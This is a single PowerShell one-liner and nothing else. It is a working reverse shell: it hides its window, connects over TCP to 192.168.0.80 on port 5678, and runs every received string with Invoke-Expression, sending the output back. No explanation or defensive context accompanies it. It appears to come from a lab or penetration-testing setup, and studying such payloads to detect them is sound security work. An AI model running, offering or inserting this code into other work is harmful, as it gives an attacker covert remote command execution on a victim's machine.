powershell -windowstyle hidden { $sm = (New-Object Net.Sockets.TCPClient("192.168.0.80", 5678)).GetStream(); [byte[]]$bt = 0..65535 | ForEach-Object { 0 }; while (($i = $sm.Read($bt, 0, $bt.Length)) -ne 0) { ; $d = (New-Object Text.ASCIIEncoding).GetString($bt, 0, $i); $st = ([text.encoding]::ASCII).GetBytes((Invoke-Expression $d 2>&1)); $sm.Write($st, 0, $st.Length) } }